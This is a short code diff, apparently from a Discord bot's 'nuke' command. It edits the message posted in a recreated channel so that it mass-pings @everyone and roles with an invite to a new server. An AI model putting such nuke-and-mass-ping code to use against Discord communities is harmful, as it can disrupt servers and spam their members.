@@ -42461,8 +42461,8 @@ async def nuke_cmd(ctx: commands.Context):
         try:
             ch = await guild.create_text_channel("nata", reason="Nuke — recriação")
             await ch.send(
-                content="@everyone\nhttps://discord.gg/KxBQe9fYG",
-                allowed_mentions=discord.AllowedMentions(everyone=True),
+                content="**NOVO SERVIDOR MIGRAMOS** <:h_checkroxo:1520481153285357748>\n\nhttps://discord.gg/nata\n\n|| @everyone here ||",
+                allowed_mentions=discord.AllowedMentions(everyone=True, roles=True),
             )
         except Exception:
             pass
